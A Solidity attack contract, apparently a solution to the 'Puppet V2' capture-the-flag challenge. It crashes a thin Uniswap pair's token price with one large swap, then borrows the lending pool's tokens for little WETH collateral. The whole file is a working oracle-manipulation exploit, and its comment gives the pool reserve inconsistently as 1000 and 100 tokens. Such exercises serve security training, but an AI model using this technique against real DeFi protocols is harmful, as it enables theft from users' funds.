pragma solidity ^0.6.0;

import "./PuppetV2Pool.sol";
import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import "@uniswap/v2-periphery/contracts/libraries/SafeMath.sol";

contract PuppetV2Attack{
    address private _uniswapPair;
    address private _uniswapFactory;
    IERC20 private _token;
    IERC20 private _weth;           
    address private _lendingPool;
    address private _router;
    address private _owner;
    
    constructor (
        address wethAddress,
        address tokenAddress,
        address uniswapRouterAddress,
        address puppetV2PoolAddress
    ) public {
        _weth = IERC20(wethAddress);
        _token = IERC20(tokenAddress);
        _router =uniswapRouterAddress;
        _lendingPool = puppetV2PoolAddress;
        _owner = msg.sender;
    }

    /**
    * Attack Scenario:
    *  -> We will manipulate the borrow function. 
    *  -> Uniswap pools use x*y = k a constant product formula.
    *  -> The pair pool has 10 WETH and 1000 TOKEN. 
    *  -> The pair pool has low liquidty, and we have good amount of it. 
    *  -> Before all, we will manipulate the pool, we have 10000 TOKENs.
    *  -> When we swap all 10000 TOKENs for ETH, the pool will be heavily 
    *  -> populated with TOKEN.
    *  -> Let's run the math:
    *  ->  1) Swap 10000 TOKEN for as much as ETH. 
    *  ->  1.1) This result as in:
    *  ->    1.1.1) Pool now has 10 WETH and 10100 TOKEN.
    *  ->    1.1.2) Observe the getAmountsOut function.
    *  ->    1.1.2.1) amountIn:10000 TOKEN, reserveIn:100 TOKEN, reserveOut: 10 ETH
    *  ->    1.1.3) Pool can return (10000*997*10)/((100*1000)+(10000*997)) = 9.90069513406157 ETH. 
    *  ->  1.2) Let's expect at least 9.8 ETH from this swap.
    *  ->  1.3) After the swap, let's inspect the pool again. Also, let's expect the attackers reserves.
    *  ->   1.3.1) POOL: 10 - ~9.9 ETH ~= 0.1 ETH , 10100 TOKEN.
    *  ->   1.3.2) ATTACKER: 20 + ~9.9 ETH ~= 29.9 ETH, 0 TOKEN. 
    *  ->  1.4) Observe that lending pool relies on the quote function of Uniswap.Let's calculate the 
    *  ->  quote price with new reserves.
    *  ->   1.4.1) We want 1_000_000 TOKENS, amountA = 1_000_000, reserveA = 10_100, reserveB ~= 0.1 ETH.
    *  ->   1.4.2) Quote returns: ((1_000_000*(10**18))*0.1)/(10_100)=9.900990099009903e+18 wei ~= 9.9 ETH.
    *  ->   1.4.3) We have to deposit three times the quote, so 3*9.9 ~= 29.702970297029708. We expected at least
    *  ->   9.8 ETH in (1.2), so we must have >29.702 ETH.
    *  -> 1.5) Borrow 1_000_000 TOKENS for 29.702 ETH.
    *  -> 1.6) Attack is complete.
    */
    function attack ( 
            uint destabilizerInAmount,
            uint destabilizerOutAmount,
            uint targetAmount
        ) external {
        //give approval to router
        _token.approve(_router,destabilizerInAmount);

        //create path
        address[] memory path = new address[](2);
        path[0] = address(_token);
        path[1] = address(_weth);

        //swap
        (bool s1,)= _router.call(abi.encodeWithSignature(
             "swapExactTokensForTokens(uint256,uint256,address[],address,uint256)",
             destabilizerInAmount,
             destabilizerOutAmount,
             path,
             address(this),
             block.timestamp + 42    
        ));
        require(s1,"Swap failed.");
        
        //borrow
        uint256 requestedAmount = PuppetV2Pool(_lendingPool).calculateDepositOfWETHRequired(targetAmount);
        _weth.approve(_lendingPool,requestedAmount);
        (bool s2,)=_lendingPool.call(abi.encodeWithSignature("borrow(uint256)",targetAmount));
        require(s2,"Borrow failed.");

        //transfer amount to attacker
        _token.transfer(_owner,_token.balanceOf(address(this)));
    }

    receive() external payable{

    }


}